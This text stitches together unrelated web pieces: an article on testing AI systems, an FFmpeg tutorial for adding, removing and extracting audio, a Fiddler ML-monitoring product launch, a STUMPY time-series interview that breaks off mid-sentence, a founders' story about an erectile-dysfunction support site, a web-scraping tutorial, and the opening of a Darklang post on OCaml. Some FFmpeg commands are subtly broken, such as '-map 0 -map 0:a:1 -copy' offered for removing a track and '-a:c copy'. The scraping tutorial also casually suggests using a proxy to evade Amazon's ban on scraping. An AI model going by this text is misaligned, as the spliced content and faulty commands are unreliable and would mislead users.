<p>Carrell suggests that what’s really needed for testing an AI is a well-thought-out culmination of automated and manual techniques. “It is true that human bias also exists. But, for the most part, the learning activities and judgment of a human will still try to emotionally as well as practically vet a particular choice,” Carrell says.</p>
<h3>How to test</h3>
<p>“There is no single recipe to describe how to properly test an AI-based system, just like there isn’t a single right method for testing any kind of system,” says Denis Leclair, VP of engineering at <a href="https://gotrellis.com/" target="_blank" rel="noopener noreferrer">Trellis</a>. “The core principles that make for a successful QA program are the same, by and large, whether or not the product employs AI.”</p>
<p>“One such principle is the need for a thorough understanding of the system’s requirements,” Leclair says. “This must include a thorough understanding of tolerances and the pass/fail criteria. For example, an AI system designed to drive an autonomous vehicle must be bound to a much lower tolerance for error than a recommender system used to recommend the next series for you to watch on your favorite streaming service.”</p>
<p>In addition, you have to find a way to test the AI’s decision-making. Is it making the right choice given the information it has available? “The determination of the right decision in and of itself is not always as clear cut as one might think,” Leclair explains.</p>
<p>“Furthermore, the appropriate test strategy will depend on a lot of the AI and machine learning (ML) techniques used in the solution,” Leclair says. “With ML, we can broadly classify any system into one of the following groups: fully supervised learning systems, semi-supervised learning systems, unsupervised learning systems, and reinforcement learning systems. The differences between these groupings are fundamentally how much information is given to the algorithm for it to train and possibly even evaluate its own correctness.”</p>
<h3>Levels of authority</h3>
<p>A primary reason for using AI is so the machine can make decisions and take action based on the inputs it receives and the range of allowed responses contained in the AI programming. But in an AI that also uses machine learning, those allowed responses may be altered. So the question then is just how much can the AI change, or what are the limits of its authority?</p>
<p>“The ‘authority’ given to the AI system can be thought of as the range of possible output values that the black box [the AI] might emit under any conceivable set of inputs and then any follow-on effects that those outputs might be connected to,” explains Leclair.</p>
<p>“For many AI applications, particularly with deep learning systems, it won’t be practical to analyze every micro-calculation being performed by the algorithm.” Leclair says. “Instead, a more statistical approach to testing these algorithms is generally the way to go. The idea is to exercise the system across a range of inputs and verify that the system’s inferences are correct (within tolerances) for those inputs.”</p>
<p>“Even if the AI models employed are deeply nested, rendering them effectively opaque, the system designer can always apply limits on the model’s outputs, effectively shaping the output to ensure that the answers remain within acceptable bounds appropriate for the target application. The QA engineers, for their part, must exercise and validate those limit checks by conducting boundary testing at the inputs and outputs of the system,” Leclair says.</p>
<p>Finally, make sure that the AI is producing data and making decisions as it’s supposed to. Leclair says the way to do this is through cross-validation. “Cross-validation is the act of testing a trained AI model against a series of previously unseen input data and evaluating the level of correctness of the output coming from the algorithm. From the QA standpoint, the objective is to validate the algorithm across a sample of input data sets representative of the range of inputs the system might expect to see in production.”</p>
<h3>Into the wild</h3>
<p><em>“</em>We are talking about creating systems that will end up being smarter than their masters,” Carrell says, “and we’re doing this by feeding them data. And so, in order to fully control how they behave or evolve over time, the key is to optimize training data. How this data is regressed and classified by the AI system will then eventually be responsible for the machine’s behavior.”</p>
<p>Look for <a href="https://www.functionize.com/blog/the-impact-of-cognitive-bias-on-software-testing/">patterns that indicate bias</a>, including any human bias and then determine whether the machine is ready to process world data. “These are the questions we want to be looking at before the machine is pushed out into the wild, to process data and dish out an entirely new result,” Carrell explains. “And so, new QA tests need to take into account security and governance measures that make an AI model completely prepared for real-world situations.”</p>
<p>Some of those tests must take into account the type of work the AI is being tasked to perform. As Leclair mentions, there’s a big difference between an autonomous vehicle and recommendations for a streaming service. As the level of responsibility grows, so must the need to confirm the limits to what the AI can do without either intervention or approval. While it may be useful for a defense AI to determine when a missile launch might be hostile, it’s critical that the AI receive approval before launching a retaliatory strike.</p>
<p>This means that even though the AI may have great latitude to learn from its inputs, it must still have limits. Perhaps, for HAL, those limits might have included Asimov’s laws.</p>
<blockquote><p>Our testing software is built on AI and machine learning, and we’re awfully proud of it. For example, Functionize uses AI to <a href="https://www.functionize.com/test-maintenance/">learn how your UI really works</a>. Renaming or restyling a button, even moving it on the page won’t break your tests. And we promise to close the pod bay doors when requested to do so.</p></blockquote>

<p><strong>FFmpeg is a super-powerful tool to add, remove, extract, or replace the audio in your video files. If you have a copy of FFmpeg installed on your computer, then you have just the tool to help you add or remove an audio track from your movie. </strong></p>



<p>Let’s get to it and see how it’s done! </p>




<h2><span id="How_to_Remove_Audio_from_Video_using_FFmpeg"></span>How to Remove Audio from Video using FFmpeg<span></span></h2>



<p>Many people want to know how to remove or delete the audio track from a video they’ve recorded. This could be because of road-noise or background noise, etc. and they want to get rid of it.</p>



<p>The simplest way to <strong>remove or delete audio is to actually copy the video to a new file and discard the audio</strong> while doing this. This is a simple technique because it does not involve the re-encoding of the video while you are at it. Here is the command line for achieving this.</p>



<pre><code>ffmpeg.exe -i videoWithAudio.mp4 -c:v copy -an videoWithoutAudio.mp4</code></pre>



<ul><li><code>-c:v copy</code> copies the video track into <code>videoWithoutAudio.mp4</code></li><li><code>-an</code> tell FFmpeg to <strong>not copy the audio</strong></li></ul>



<p>Now this works great if you have only one audio track in your movie. But, what happens if you have three or four audio tracks and you want to remove only the second audio track? </p>



<p><strong>How do you remove a specific audio track using FFmpeg?</strong></p>



<p>Let’s take a look in the next section.</p>



<hr>



<h2><span id="How_to_Remove_a_Specific_Audio_Track_using_FFmpeg"></span>How to Remove a Specific Audio Track using FFmpeg<span></span></h2>



<p>For removing a specific audio track using FFmpeg, you can always use the <code>map</code> command. </p>



<p>The general syntax of the <code>map</code> command is <code>-map input_file_index:stream_type_specifier:stream_index</code>. </p>



<p>So, you could select the 2nd audio track of the video by saying <code><strong>-map 0:a:1</strong></code> because the numbering starts at 0. In our example, if your file has 1 video track and two audio tracks, then you can use <code>-map 0:a:1</code> to only select the second audio track and copy it to your final output. </p>



<p>Also, <code>-map 0</code> selects everything from the first input. So, basically, you are selecting everything and <strong>then</strong> de-selecting the audio.</p>



<pre><code>ffmpeg.exe -i videoWithAudio.mp4 -map 0 -map 0:a:1 -copy videoOutput.mp4</code></pre>



<p>If you have 5 audio tracks and you want to select all but the first one, then you can use the negative <code>map</code> command. By saying <code>-map -0:a:0</code> you are telling FFmpeg to ignore the first audio track. Negative <code>map</code> is very powerful! </p>



<p>Actually, in the previous section, we learned how to remove audio from your video using <code>-an</code>, right? You can do this using negative mapping as well as follows. </p>



<pre><code>ffmpeg -i videoWithAudio.mp4 -map 0 -map -0:a videoWithoutAudio.mp4 </code></pre>



<hr>



<h2><span id="How_to_Add_an_Audio_Track_using_FFmpeg"></span>How to Add an Audio Track using FFmpeg<span></span></h2>



<p>Now that you removed an audio track, you might want to add one too, right? Here’s how you add an audio track to your video using FFmpeg. </p>



<p>Since you have already read about the <code>map</code> command in the previous section, this should be very easy. Here is the command line</p>



<pre><code><code>ffmpeg \</code>
<code>-i video.mp4 \</code>
<code>-i audio.mp3 \</code>
<code>-c copy \</code>
<code>-map 0:v:0 \</code>
<code>-map 1:a:0 \</code>
<code>videoWithAudio.mp4 </code></code></pre>



<p>This is very easy to understand. What you’re doing is copying the audio and video from two different files using the <code>map</code> command to an output file. </p>



<ul><li><code>-map 0:v:0</code> selects the 0th track of the 0th input file (our video input).</li><li>–<code>map 1:a:0</code> selects the 0th track of the 1st input file (our audio input).</li><li><code>-c copy</code>` copies both the tracks (audio and video) to the output without re-encoding. If you want to re-encode, you can use the appropriate audio/video codecs with your choice of quality settings. </li></ul>



<hr>



<h2>How to Extract Audio from Video using FFMpeg?<span></span></h2>



<p>Another very useful and common operation is extracting audio from video using FFmpeg. You can do this with and without re-encoding the audio. </p>



<p>In the first case, let’s take a look at extracting the audio out of a media file and storing it without re-encoding it. </p>



<p>Extracting the audio involves discarding the video, right? And this is easily achieved using the <code>-vn</code> command that removes the video. The <code>-vn</code> command is similar to the <code>-an</code> command which removes the audio track. </p>



<p>Then, all you have to do is copy the audio from the source to the destination. This is done using the <code>-acodec copy</code> command that tells FFmpeg to only copy the audio and not re-encode it. </p>



<pre><code><code>ffmpeg -i videoWithAudio.mp4 -vn -acodec copy onlyAudio.aac </code></code></pre>



<p>Simple, right?</p>



<p>Now, let’s take a different use case where you might want to re-encode the audio after extracting it. Here’s how to extract the audio from the video using FFmpeg and then encoding it to a different quality level using <code>libmp3lame</code> and storing it as an mp3 file.</p>



<pre><code>ffmpeg.exe -i videoWithAudio.mp4 -vn -c:a libmp3lame -q:a 1 onlyAudio.mp3</code></pre>



<p><code>-q:a</code> uses quality presents defined in <a href="https://wiki.hydrogenaud.io/index.php/LAME" target="_blank" rel="noopener">LAME’s documentation</a> ranging from 0-6 where 0 is high-quality audio and 6 is on the lower end. </p>

<h2><span id="How_to_Replace_Audio_in_a_Video_using_FFMpeg"></span>How to Replace Audio in a Video using FFMpeg?<span></span></h2>



<p>This is the final scenario that we will examine today. How do you replace the audio track of a video that already contains audio?</p>



<p>There is a two-step answer to this that we have already discussed which is to </p>



<ol><li>remove the audio </li><li>add the replacement audio. </li></ol>



<p>But, is there a better or quicker way to do this? Well, with FFmpeg, there is *always* a better way to do something 🙂 </p>



<p>The general syntax of the <code>map</code> command is <code>-map input_file_index:stream_type_specifier:stream_index</code>. So, you could select the 3rd audio track of the 2nd input by saying <code><strong>-map 1:a:2</strong></code> because the numbering starts at 0.</p>



<pre><code><code>ffmpeg -i video_with_audio.mp4 -i newAudio.wav \</code>
<code>-map 0:0 \</code>
<code>-map 1:0 </code>\
<code>-c:v copy \</code>
<code>-c:a libmp3lame -q:a 1 \</code>
<code>-shortest</code> \
video_with_newAudio<code>.mp4</code>
</code></pre>



<p>In our situation, we want to take the video from one file and the audio from another file. So, the <code>map</code> command comes in handy here as shown above. We are selecting the 0th track from the 1st input (our video), and the 0th track from the 2nd input (our audio).</p>



<p>Then we copy the video as is and re-encode the audio before putting them together in our new file. If you don’t want to re-encode the audio, you could simply say <code>-a:c copy</code> and the audio track will get copied and not re-encoded. </p>



<p>The <code>-shortest</code> command is used to ensure that the conversion stops when the length of the shorter of the two inputs is reached. You can discard this if it does not matter in your use case. </p>



<hr>

<p>There you have it – now you know how to add, remove, replace, or extract audio from a video using FFmpeg. </p>

<p><em><em>Today, at the VentureBeat Transform event, we launched our ML Monitoring feature set, inclusive of data drift detection, outlier detection, and data integrity. These capabilities are coupled with Fiddler’s industry-leading Explainable AI Platform to efficiently and effectively explain, analyze, and resolve MLOps production monitoring issues</em>.</em></p>



<h2><strong>Challenges in MLOps Monitoring&nbsp;</strong></h2>



<p>AI adoption is accelerating, with <a href="https://www.stateofai2019.com/">one in ten enterprises currently using ten or more AI applications</a> and <a href="https://www.gartner.com/document/3984974?ref=solrAll&amp;refval=256236044">75% of businesses expected to shift from piloting to operationalizing AI by 2024</a>. This trend has only been amplified by the pressure from Covid-19 to adopt automation to help cut costs. But the complexity of deploying ML has hindered the success of AI systems. Even beyond the challenge of amassing the right data to train models, model deployment and management present similar challenges to those that plagued software prior to the arrival of DevOps Monitoring.</p>



<h3><strong><strong>Challenge 1: Unreliable Inputs: feature drift, errors, and outliers</strong></strong></h3>



<p>Models are trained on historical data with the hope of generalizing to future examples. Unfortunately, trends and thus the data received by models often change, which in turn affect model performance. When such data drifts occur, data scientists must decide whether to act, often by retraining the model, or do nothing. Assessing the impact of a drift can help inform this decision, but today’s tools often inhibit the ability to attribute drift of one or more features to a shift in the model’s predictions.</p>



<p>Moreover, complex and brittle feature pipelines are liable to break at any moment. These breaks can range from virtually no effect to the model to a complete loss of functionality that causes the model to error out. Common types of feature pipeline errors include null or missing values, type mismatches, and range anomalies. Rapidly identifying and addressing these errors is paramount to ensuring reliability for deployed AI systems and the downstream applications and services they power.</p>



<p>Finally, deployed AI models may encounter seemingly valid data points containing values that fall outside the range of values within the training set. Detecting these outliers is important to ensure optimal performance of models and also best serve those who are impacted by these models. A decision to deny a loan to a fully viable applicant because the model detected this applicant as an outlier is bad for both the organization as well as the consumer.&nbsp; Today, such outliers often require anomaly detection systems on model inputs to identify.&nbsp;</p>



<h3><strong><strong><strong>Challenge 2: Uncertain feedback</strong></strong></strong></h3>



<p>After training a model, practitioners use the model’s target to assess the model’s performance. Production models, however, might not have access to the real-world results of their decisions until long after they’ve been made (for instance, a loan application system might not be notified of a default for months after the loan was approved). In this case, model metrics like AUC, precision, recall etc. cannot be calculated to assess real-time model performance. In the absence of live ground truth, ML practitioners must turn to proxy metrics, like prediction scores or intermediate model decisions, for model performance.&nbsp;</p>



<h3><strong><strong><strong><strong>Challenge 3: Tedious debugging&nbsp;</strong></strong></strong></strong></h3>



<p>In addition to merely tracking the aforementioned metrics and identifying when anomalies or issues arise, MLOps teams must then debug the issues as swiftly as possible. Given the complexity and black-box-nature of many AI systems, attribution of the symptom to its underlying cause–ie root cause analysis–is often incredibly difficult. If a specific feature is exhibiting issues, it may be straightforward to check the code and upstream systems used to generate that feature for changes or errors. But if the model’s overall performance begins to degrade, where do you start your investigation?</p>



<h2><strong><strong>Explainable AI + ML Monitoring = Comprehensive &amp; Actionable MLOps&nbsp;</strong></strong></h2>



<p>Today, at VB Transform, we launched our <a href="https://www.fiddler.ai/ml-monitoring">ML Monitoring suite</a>, to enable businesses of all sizes to monitor, explain, and analyze their AI in production and build more reliable, performant, and trustworthy AI models. Here’s an overview of capabilities available for use:&nbsp;</p>



<h3><strong><strong><strong><strong>Drift Detection</strong></strong></strong></strong></h3>



<p>With Fiddler’s drift detection capabilities, businesses are continuously alerted to changes in model feature or prediction distributions from their training baselines. This enables them to determine when it’s time to retrain models based on the impact of changes. Additionally, Fiddler attributes these changes to the underlying features causing them using AI Explainability. This enables practitioners to understand the ‘why’ and ‘how’ behind their model’s behavioral changes for faster problem resolution.&nbsp;</p>


	
	


<h3><strong><strong><strong><strong>Data Integrity</strong></strong></strong></strong></h3>



<p>Data inconsistencies can often go unnoticed in deployed AI systems. With Fiddler, teams can easily detect feature errors like missing values, type mismatch, and range anomalies, thereby reducing overall issue resolution time.</p>



<h3><strong><strong><strong><strong>Outlier Detection</strong></strong></strong></strong></h3>



<p>With the ability to detect outliers or anomalies in model predictions and features, users get a bird’s eye view into all anomalies to ensure they are catching these accurately and immediately. This can then be coupled with Fiddler’s AI explanations to quickly observe how the model is treating these outlying points.</p>


	
	


<h3><strong><strong><strong><strong><strong>Real-Time Alerting &amp; Explainable AI powered debugging</strong></strong></strong></strong></strong></h3>



<p>Alerts are critical to ensure teams catch things as they happen. Fiddler allows you to configure alerts for changes to model performance, prediction and feature drift, and service health, to be notified the moment something changes.&nbsp; When coupled with Explainable AI analytics, users can quickly identify the root cause of issues and troubleshoot them appropriately</p>

What are the goals of the project?</h2><p id="e0fa">Numerous classical methods exist for understanding and analyzing time series data, such as data visualization, summary statistics, ARIMA modeling, Markov modeling, anomaly detection, forecasting, machine learning, deep learning, etc. The list goes on. However, when a data practitioner is presented with new or unfamiliar time series data, many of the aforementioned approaches often fail to uncover any significant pattern, anomaly, or unique observation since it isn’t known, a priori, whether or not an interesting insight even exists. Of course, if a behavior is found to be conserved within your time series (though, this may not always be true), then there must have been a reason why it was conserved and teasing out those reasons or causes can often be very useful. Note that with time series analysis we are rarely interested in single point statistics (i.e., global max, global min, etc) and, instead, it is more valuable to discover interesting “subsequences” (i.e., a continuous run of values along your time series with a preset length). So, when starting with time series analysis, one should really be asking:</p><ol><li id="3acd">Do any conserved behaviors (i.e., repeating subsequences) exist in my time series data?</li><li id="2a2a">If there are conserved behaviors, what are they and where are they?</li></ol><p id="411b">A naive but straightforward approach that can help answer these questions (covered in more detail <a href="https://stumpy.readthedocs.io/en/latest/Tutorial_The_Matrix_Profile.html" rel="noopener">here</a>) could involve comparing the Euclidean distance for every subsequence within the time series in a pairwise fashion in order to identify subsequences that are either highly conserved or exceptionally rare. This seems intuitive at first and it provides an exact solution to our problem but, as the size of the dataset increases (&gt;10,000 data points), this brute force search can quickly become computationally intractable and reveals why approximate solutions (i.e., allowing for false positives and false negatives) or less interpretable solutions (above) have prevailed. Recently, <a href="https://www.cs.ucr.edu/~eamonn/MatrixProfile.html" rel="noopener">independent research conducted at UC Riverside</a> has spawned a collection of brand new ideas and they have developed scalable algorithms that directly addresses this hard computational problem. However, the knowledge and capabilities that have been transferred to the scientific Python community has been limited.</p><p id="01c6">And so, STUMPY was born. <a href="https://github.com/TDAmeritrade/stumpy" rel="noopener">STUMPY</a> is a powerful and scalable Python package that faithfully reproduces the aforementioned academic work and, at its core, efficiently computes something called a “matrix profile”, which can be used for a variety of time series data mining tasks. Essentially, a matrix profile is a vector that stores the Euclidean distance (and index location) between each subsequence within a time series and its nearest neighbor. And, with 100% code coverage and multi-CPU/multi-GPU support out of the box, the goal of STUMPY is to provide a highly reliable and user-friendly interface for modern time series analysis that can quickly and easily scale up to accommodate your ever-growing data needs.</p><h2 id="692d">What kind of time series analysis can be done with Stumpy? In what fields do you think it will help the most?</h2><p id="94c9">As mentioned above, STUMPY is focused on efficiently computing a simple-to-interpret but highly useful data structure called the “matrix profile”. Earlier, Eamonn Keogh, one of the original academic researchers, claimed that “Given the matrix profile, most time series data mining problems are easy or trivial to solve in a few lines of code.” In fact, Keogh and his colleagues have since published over 20 papers demonstrating the many things that can be done once you’ve computed the matrix profile and, below, are a just few examples:</p><ol><li id="c715">Motif discovery — identify conserved subsequences (related to pattern recognition)</li><li id="9b22">Discord discovery — uncover subsequences that are poorly conserved (related to anomaly detection)</li><li id="31e7">Time series chains — find related patterns that are evolving monotonically over time (related to forecasting)</li><li id="58fb">Semantic segmentation — automatically determine regime changes within your time series data (related to change point detection)</li><li id="b07f">Streaming data analysis</li><li id="1b98">Multi-dimensional matrix profiles</li><li id="0f0d">Time series clustering</li><li id="2da2">And more…</li></ol><p id="81be">One of the benefits of computing matrix profiles with STUMPY is that it is 100% domain agnostic. This means that it is completely generalizable and can be applied in any field where you need to analyze continuous sequential data! In addition to the previously published examples, STUMPY has been applied in analyzing the stock market, bettering server uptime and resiliency, investigating call center conversation flow, understanding IoT sensor data, improving cryptocurrency model predictions, and stabilizing ion acceleration at CERN, just to name a few. Today, time series data is ubiquitous in both academia as well as industry and so we believe that STUMPY is a new tool that is extremely well positioned to help researchers and data scientists explore their data in a systematic and focused way and, hopefully, allow them to discover new insights with much less frustration and time spent. If you already have Python installed then you should be able to get started with STUMPY in less time than it takes for you to make a cup of coffee.</p><h2 id="cc70">What are the benefits of computing the matrix profile in the context of analyzing a time series? What are the advantages over other methods?</h2><p id="2e1d">Matrix profiles are simple, intuitive, and interpretable. Basically, if you understand what Pythagorean theorem is then you’re all set! Whereas with other methods, if you step away from the analysis for six months and then come back to it, you often have to perform a lot of mental gymnastics in order to remember and understand what was going on. With a single line of STUMPY code, you can compute your matrix profile and <a href="https://stumpy.readthedocs.io/en/latest/Tutorial_STUMPY_Basics.html" rel="noopener">quickly identify motifs (conserved patterns) and discords (potential anomalies) by looking at the minima and maxima</a>, respectively. From there, a slew of rapid post-analyses can be performed using the matrix profile and the subsequent results can help you develop further hypotheses and questions about your data. Additionally, unlike other methods which may be riddled with false positives and false negatives, matrix profiles are exact and don’t require any “training” in order to find patterns. It just works right out-of-the-box!</p><h2 id="2da0">What is the general criteria when choosing a window size? Is there some indicator to look up when analysing a time series?</h2><p id="2f52">That’s a good question. Usually, the window size (i.e., the length of your subsequence or sliding window) should be chosen to be large enough to encompass a potential pattern. This usually requires a little bit of domain knowledge but the academic researchers have found that matrix profiles are not so sensitive to the choice of the window size so long as it isn’t smaller than the subsequence pattern. So, being in the rough ballpark is usually enough. However, since matrix profiles are pretty fast and cheap to compute, your best bet is to simply try several different window sizes, perhaps, by repeatedly doubling your window size and observing where there may be conserved minima/maxima across the set of matrix profiles. The academic researchers have also published a paper (which you can download <a href="https://www.cs.ucr.edu/~eamonn/PAN_SKIMP%20%28Matrix%20Profile%20XX%29.pdf" rel="noopener">here</a>) detailing a similar approach called a “pan matrix profile” that can help narrow down the search space. So, look out for this new STUMPY feature in an upcoming release!</p><h2 id="cbf0">What is semantic segmentation in the context of time series? What were the problems in the past with this method and how do you solve them?</h2><p id="253e">In the context of time series, “semantic segmentation” is “the division of a time series into internally consistent areas/regimes” or, sometimes, you can think of it as a “special type of clustering with the additional constraint that the elements in each cluster are contiguous in time”. Basically, if you have a time series where the values are repeating periodically within some range and then, in response to some external change or event, the time series shifts into another mostly periodic range so that you are left with two distinct “regimes”, then semantic segmentation may be useful for helping you identify the boundary in between the regimes. Now, methods like “change point detection” exist for detecting changes in various statistical properties of the time series (i.e., the mean or variance) but, fundamentally, we are interested in regimens which are defined by changes in the shapes of the …</p></div></div></section></div>

                <p>It is difficult to explain the feeling of not being able to get it up.</p>
<p>Thought processes speed up as your heart rate rises. The instant panic, the dread and the crippling embarrassment. You want out. Quick – say something. Anything that says that you aren’t broken …</p>
<p><strong>“Weird… this has never happened before”</strong></p>
<p>Wait… have I just blamed her? Aaaaargh! I hope she wants to see me again. No, I hope she doesn’t. Imagine if it happened twice, that would make it a thing.</p>
<p>One day in 2018 my cousin Xander and I were on a long car journey and decided to chat about something we had never spoken about before. To anyone. The struggles we had been having with our erections. Never before has the saying, a problem shared is a problem halved, been so true. Instantly what had been an isolating fear could be laughed about. Our shared panics, like believing that as young men we were going to live lives of sexless bachelorhood were ridiculous.</p>
<p>The causes behind our problems were very different, which was great news as it meant we knew we didn’t come from a family plagued with poor erection genes. We are from a family of 18 cousins after all.</p>
<p>Although different, our experiences shared the feeling of not knowing where to turn and what to do about it. The resources available to healthy young men were inadequate, biased and often blatantly trying to sell you something rather than fix the problem. But we thought perhaps that market is under-catered because we were the unfortunate few healthy young men who had problems…</p>
<blockquote><p>In 1999, the American Medical Association published research reporting that 5% of men between the age of 18 – 59 experienced ED. Eleven years later in 2010, the University of Sao Paulo published a study showing that rates of ED in men between the age of 18 – 40 was now at 35%.</p></blockquote>
<p>Even with a pool of younger participants, rates of erection issues had exploded!</p>
<p>What’s changed in men’s lives to explain this? Rise in obesity? Mobile phone use? Something in the water? Nothing that could warrant this kind of an upturn had changed in men’s physiology. We drew our assumption, that is widely accepted amongst experts in the field, young men are largely suffering from psychologically induced erectile issues.</p>
<h3>Mojo Men was born!</h3>
<p>At the time, our home town of London was awash with advertising for discreet Viagra delivery services. Companies marketing themselves to young men and testifying that erection problems are common and taking Viagra is not only normal but the answer. We thought that erection medication was for porn stars and old men! Both need a medical boost to get over the physical problems of needing to have unnatural amounts of sex and to defeat ageing equipment. But why would young men take a biochemical solution to what is a psychological problem… because we weren’t being offered an alternative.</p>
<p>We do not want Mojo Men just to be an expert led online rehabilitation tool for erection issues. It should be a community where men feel safe sharing their experiences. After all telling someone was perhaps the most powerful part of our experience.</p>
<p>Erection issues need to be taken more seriously and we need to talk about them because unattended they can become a mental health concern. Men can feel isolated, unable to understand or share their concerns.</p>
<p>Want to be part of Mojo Men? Please contact us. We would love to hear from you.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Web Scraping is nothing but extracting a large amount of data from the internet and storing it in your local drive. Here you will be extracting the data directly from the source. With the help of scraping, now you will be able to download and store data which you previously could not .&nbsp;&nbsp;</p>
<h2>Is it legal ?&nbsp;</h2>
<p>Yes, it is, provided the data is in public domain and doesn’t have any copyright.&nbsp;</p>
<h2>How is Web-scraping with Python useful?</h2>
<p>Web scraping with Python is generally used to gather huge amounts of data and process it according to one’s needs. For example, you might want to get the data (Cost, reviews, etc)&nbsp; a particular product from various sellers on amazon, and then compare them to decide which one you want to go for. In such cases, it’s easier to scrape the data.&nbsp;</p>
<p>(Note – Amazon does not allow this and your IP will be banned , so you will have to use a proxy)&nbsp;</p>
<h2>How to perform Web-scraping ?</h2>
<p>Here, you will learn how to use web scraping with Python to solve a particular type of problem.</p>
<p>Every year, lakhs of students write public exams and at the time of results, I have seen my teachers struggle to try to extract all their students’ data from the result website. It’s a tedious job of manually entering each student’s ID and copying their sore to an excel sheet. So we are going to solve this issue by python code and selenium API to extract the required data and save it in an excel sheet.</p>
<h2>1. Prerequisites</h2>
<p>Make sure to install the following packages :</p>
<ol><li><strong>requests</strong> – Package is used to get the HTML of the website you are requested for scraping.</li><li><strong>lxml</strong> – This library is used to parse the data type into python readable data type.</li><li><strong>BS4</strong>– This library is used to analyze the extracted web page</li><li><strong>selenium</strong> -To connect with the web browser and perform the task required task.</li><li><strong>openpyxl</strong> – To work with excel workbooks.</li><li><strong>argparse – </strong>To take the arguments from the<strong> </strong>command line</li></ol>
<p>To install it , just open command prompt and type:&nbsp;</p>
<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">pip install requests 
pip install  lxml
pip install  BS4
pip install  selenium
pip install openpyxl
pip install argparse</pre>
<p>After installation , download the web browser drivers. Following are the links for different web browsers, choose the appropriate one.&nbsp;</p>
<p>(Note – always install the version corresponding to the version of your web-browser )</p>
<figure><figcaption>Links to download Selenium websrivers</figcaption></figure>
<h2>2. Inspecting</h2>
<p>For the problem we’re trying to solve, we have a web page (image 1) where we need to enter student’s registration numbers and press enter to see the results. The results will be displayed as seen in image 2 .&nbsp;</p>
<p>To automate this process, we need the HTML tag for the input box and tags for the data we need from the Result pagem . Tags such as students name, subject, marks,etc&nbsp; should be extracted.</p>
<figure><img src="https://lh5.googleusercontent.com/b39MHJ-kgiCMOxOLrSGz2D_NwuJKb2XWYMWCZvUutJ8mtAo4Nza4TnE78QbipdZlhma1YsNXSWx29Urc59Y9QsDgPaMW3cunLuu5jPqOxIiXp8y3Qp1uywxIONoZvKy0LFu7Iajo" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"><figcaption>Image 1: Homa page of the website</figcaption></figure>
<figure><img src="https://lh3.googleusercontent.com/UeVP_pSL8WQOMduO4l8qsRm02zC6Pq4VZ6nvLKijMU1iKjcRJdAZ-kvXSlC8_XgisDSrsLgTNSXCrSxj5krS5gbXHm4NSWyu37762KoUOa89tTRhDArQlYtgS_PrFdKvvxVwvRNA" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"><figcaption>Image 2: Student Marks</figcaption></figure>
<p>The following are the steps to identity the required Tags:</p>
<ol><li>To check for the DOM, right click on the input box where you enter the registration number and click on inspect element . In the elements tab when you place your cursor on: id = “reg” , it highlights the input box where you can enter the registration number. Now we know that the key/tag is “reg”, we will be using this in our code to input the students registration number.</li></ol>
<figure><img src="https://lh6.googleusercontent.com/IAg72__sez170LjvWcOsr9MMGrcZnUQ8oqeKZilONzs-LtyKKF9r8CHJGRExx9l3Xm14vQYqhth0krI4p1yn1huimOTNZTbSX2lPhdX7C8r1QHd5TI_fbloDBlMH6HJPQzKzy3xb" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></figure>
<ol start="2"><li>Similarly in the results page ,we right click on the Student name and select inspect element . Here the cursor is moved on the student’s name , the tag “td” is highlighted.&nbsp;</li></ol>
<p>As you explore, we see that all the data we need are under the “td” tag. We can now use this tag to extract our data.</p>
<figure><img src="https://lh3.googleusercontent.com/3de6jDCOF974pRmnLH1VltKg-6DUBzKky3sG5WHi7NJYQBcj0YIxAAzMz-wQXU6u2x4gvMb66JTo-zLUaj_PAmtSsZ-Ro2CPWFEGM-vLADF2-ad4Ye64kLWt9ecl3eg2H6adGVkW" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></figure>

<h2>Conclusion</h2>
<p>So, this was our introduction to extracting the data from the website and the first part to web scraping with python. In the next part, we will get into the programming part of it, you can find the link to the second part below.</p>

                    <p><em>Part of a 3 part series. Followups on <a href="https://blog.darklang.com/new-backend-fsharp/">F#</a>, <a href="https://blog.darklang.com/why-dark-didnt-choose-rust/">Rust</a></em></p><p>I built the first demo of Dark in Python, in about two weeks. A few months later when I started productizing it, I rebuilt it in OCaml. Back in 2017, when I was considering the language and platform to use for Dark, OCaml was extremely compelling:</p><ul><li>it's a high-level language with static types, so easy to make large scale changes as we figure out what the language/product was</li><li>you mostly model data with sum types, which in my mind are the best way to model data</li><li>it's very similar to the language I wanted to build (in particular, we could reuse built-in immutable data structures for Dark's values)</li><li>it had a reputation for being high-performance, which meant that we could write an interpreter for Dark and not have it be terribly slow (vs writing an interpreter in python, which might be too slow)</li></ul><p>Unfortunately, as we've built Dark we've run into significant problems that have made it challenging to build in OCaml.</p><h2 id="lack-of-libraries">Lack of libraries</h2><p>When you bet on an off-mainstream language, one of the things you accept is that many libraries are not going to be available. When there is a small community, often there aren't enough people working in the language to make important libraries. This is especially true if few people are building business applications.</p><p>In OCaml there are many high quality libraries, especially for data structures and data manipulation. The annual<a href="https://opensource.janestreet.com/core/"> Jane Street code dump</a> has been quite useful and very high quality. However, we really felt the lack of several libraries. The most obvious of these is that we had to build a <a href="https://github.com/darklang/dark/blob/main/backend/libexecution/unicode_string.mli">Unicode string library</a> ourselves (built on top of the <a href="https://erratique.ch/software/uuseg">very impressive OCaml Unicode libraries</a> built by <a href="https://erratique.ch/contact.en">Daniel Bünzli</a>), but we needed many more libraries than that.</p><p>The lack of an SDK for Google Cloud has affected us greatly. When you're searching for product-market fit, you do the simplest, easiest thing. If you lack a good SDK for your cloud provider, the simplest, easiest thing is often a terrible architectural choice. We've built our own queue on top of our database rather than using the production-quality cloud queues available on GCP. Similarly, we barely use the Cloud Storage (GCP's version of S3), because we initially put things in the database <a href="https://blog.darklang.com/evolving-darks-tracing-system/">because it was easier</a>. We've built 3 services, 2 <a href="https://github.com/darklang/dark/tree/main/containers/stroller">in</a> <a href="https://github.com/darklang/dark/tree/main/containers/queue-scheduler">Rust</a>, and 1 in <a 